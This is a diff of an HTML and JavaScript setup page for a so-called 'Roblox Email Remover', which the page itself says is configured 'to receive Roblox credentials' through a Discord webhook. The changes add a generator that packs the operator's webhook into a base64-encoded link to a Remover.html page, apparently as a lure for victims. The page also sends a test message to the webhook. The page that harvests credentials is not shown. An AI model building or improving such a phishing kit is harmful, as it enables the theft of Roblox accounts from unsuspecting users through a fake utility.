@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Email Remover Setup</title>
+    <title>Roblox Email Remover Setup</title>
     <link href="all.min.css" rel="stylesheet">
     <link href="css2.css" rel="stylesheet">
     <style>
         :root {
-            --primary: #0066ff;
-            --secondary: #00a2ff;
+            --primary: #7030a0;
+            --secondary: #9966cc;
             --dark: #1a1a1a;
             --light: #f5f5f5;
             --success: #28a745;
@@ -27,7 +27,7 @@
         }
 
         body {
-            background: linear-gradient(135deg, #0066ff, #00a2ff);
+            background: linear-gradient(135deg, #7030a0, #9966cc);
             min-height: 100vh;
             padding: 20px;
             color: var(--dark);
@@ -93,7 +93,7 @@
         .input-field:focus {
             outline: none;
             border-color: var(--primary);
-            box-shadow: 0 0 0 3px rgba(0, 102, 255, 0.2);
+            box-shadow: 0 0 0 3px rgba(112, 48, 160, 0.2);
         }
 
         .btn {
@@ -128,8 +128,8 @@
         }
 
         .info-box {
-            background: rgba(0, 102, 255, 0.1);
-            border: 1px solid rgba(0, 102, 255, 0.3);
+            background: rgba(112, 48, 160, 0.1);
+            border: 1px solid rgba(112, 48, 160, 0.3);
             border-radius: 8px;
             padding: 15px;
             margin-top: 20px;
@@ -171,14 +171,60 @@
             border-radius: 8px;
             color: var(--success);
         }
+
+        .generated-link {
+            display: none;
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(112, 48, 160, 0.1);
+            border: 1px solid rgba(112, 48, 160, 0.3);
+            border-radius: 8px;
+        }
+
+        .generated-link-title {
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: var(--primary);
+        }
+
+        .link-container {
+            background: #f5f5f5;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 10px;
+            margin-bottom: 10px;
+            word-break: break-all;
+            font-family: monospace;
+        }
+
+        .copy-btn {
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 8px 15px;
+            font-size: 0.9rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: inline-flex;
+            align-items: center;
+        }
+
+        .copy-btn i {
+            margin-right: 5px;
+        }
+
+        .copy-btn:hover {
+            background: var(--secondary);
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="card">
             <div class="header">
-                <h1 class="title">Email Remover Setup</h1>
-                <p class="subtitle">Configure your Discord webhook to receive Roblox credentials</p>
+                <h1 class="title">Roblox Email Remover</h1>
+                <p class="subtitle">Generate your custom email remover link</p>
             </div>
 
             <div class="input-group">
@@ -188,9 +234,24 @@
                 <input id="webhook-url" class="input-field" type="text" placeholder="https://discord.com/api/webhooks/..." />
             </div>
 
-            <button id="save-btn" class="btn">
-                <i class="fas fa-save"></i> Save Configuration
+            <div class="input-group">
+                <label for="directory" class="input-label">
+                    <i class="fas fa-folder"></i> Directory Path
+                </label>
+                <input id="directory" class="input-field" type="text" placeholder="EmailRemover/(YOUR_DIRECTORY)" />
+            </div>
+
+            <button id="generate-btn" class="btn">
+                <i class="fas fa-bolt"></i> Generate Remover Link
             </button>
+
+            <div id="generated-link" class="generated-link">
+                <div class="generated-link-title">Your Generated Link:</div>
+                <div id="link-container" class="link-container"></div>
+                <button id="copy-btn" class="copy-btn">
+                    <i class="fas fa-copy"></i> Copy Link
+                </button>
+            </div>
 
             <div class="info-box">
                 <div class="info-title">
@@ -198,18 +259,14 @@
                 </div>
                 <div class="info-content">
                     <ol>
-                        <li>Open Discord and go to the server where you want to receive notifications</li>
+                        <li>Open Discord and go to the server where you want to receive credentials</li>
                         <li>Right-click on a text channel and select "Edit Channel"</li>
                         <li>Go to "Integrations" > "Webhooks" > "New Webhook"</li>
-                        <li>Give your webhook a name (e.g., "Roblox Credentials")</li>
+                        <li>Give your webhook a name (e.g., "Email Remover")</li>
                         <li>Click "Copy Webhook URL" and paste it in the field above</li>
                         <li>Click "Save Changes" in Discord</li>
                     </ol>
                 </div>
-            </div>
-
-            <div id="success-message" class="success-message">
-                <i class="fas fa-check-circle"></i> Configuration saved successfully! You can now close this page and use the Email Remover Tool.
             </div>
         </div>
     </div>
@@ -217,17 +274,15 @@
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             const webhookUrlInput = document.getElementById('webhook-url');
-            const saveBtn = document.getElementById('save-btn');
-            const successMessage = document.getElementById('success-message');
+            const directoryInput = document.getElementById('directory');
+            const generateBtn = document.getElementById('generate-btn');
+            const generatedLinkDiv = document.getElementById('generated-link');
+            const linkContainer = document.getElementById('link-container');
+            const copyBtn = document.getElementById('copy-btn');
 
-            // Check if webhook URL is already saved
-            const savedWebhook = localStorage.getItem('discord_webhook_url');
-            if (savedWebhook) {
-                webhookUrlInput.value = savedWebhook;
-            }
-
-            saveBtn.addEventListener('click', function() {
+            generateBtn.addEventListener('click', function() {
                 const webhookUrl = webhookUrlInput.value.trim();
+                const directory = directoryInput.value.trim();
                 
                 if (!webhookUrl) {
                     alert('Please enter a Discord webhook URL');
@@ -239,16 +294,34 @@
                     return;
                 }
 
-                // Save webhook URL to localStorage
-                localStorage.setItem('discord_webhook_url', webhookUrl);
+                if (!directory) {
+                    alert('Please enter a directory path');
+                    return;
+                }
 
-                // Show success message
-                successMessage.style.display = 'block';
-                
-                // Redirect to index.html after 2 seconds
-                setTimeout(function() {
-                    window.location.href = 'index.html';
-                }, 2000);
+                // Generate a unique token (simple implementation)
+                const timestamp = Date.now();
+                const randomPart = Math.random().toString(36).substring(2, 10);
+                const token = `${timestamp}-${randomPart}`;
+
+                // Create the link with encoded parameters
+                const params = new URLSearchParams();
+                params.append('webhook', btoa(webhookUrl));
+                params.append('dir', btoa(directory));
+                params.append('token', token);
+
+                // Base URL (replace with your actual domain in production)
+                const baseUrl = window.location.origin + window.location.pathname.replace('setup.html', '');
+                const generatedLink = `${baseUrl}Remover.html?${params.toString()}`;
+
+                // Display the generated link
+                linkContainer.textContent = generatedLink;
+                generatedLinkDiv.style.display = 'block';
+
+                // Store the webhook and directory in localStorage
+                localStorage.setItem('discord_webhook_url', webhookUrl);
+                localStorage.setItem('email_remover_directory', directory);
+                localStorage.setItem('email_remover_token', token);
 
                 // Test the webhook
                 const testData = {
@@ -256,11 +329,16 @@
                     embeds: [{
                         title: 'Configuration Test',
                         description: 'This is a test message to confirm your webhook is working correctly.',
-                        color: 0x00FFFF,
+                        color: 0x0066FF,
                         fields: [
                             {
                                 name: 'Setup Time',
                                 value: new Date().toLocaleString(),
+                                inline: true
+                            },
+                            {
+                                name: 'Directory',
+                                value: directory,
                                 inline: true
                             }
                         ]
@@ -283,7 +361,19 @@
                 .catch(error => {
                     console.error('Error sending test message:', error);
                     alert('Failed to send test message. Please check your webhook URL and try again.');
-                    successMessage.style.display = 'none';
+                });
+            });
+
+            copyBtn.addEventListener('click', function() {
+                const linkText = linkContainer.textContent;
+                navigator.clipboard.writeText(linkText).then(function() {
+                    copyBtn.innerHTML = '<i class="fas fa-check"></i> Copied!';
+                    setTimeout(function() {
+                        copyBtn.innerHTML = '<i class="fas fa-copy"></i> Copy Link';
+                    }, 2000);
+                }).catch(function(err) {
+                    console.error('Could not copy text: ', err);
+                    alert('Failed to copy link. Please select and copy it manually.');
                 });
             });
         });
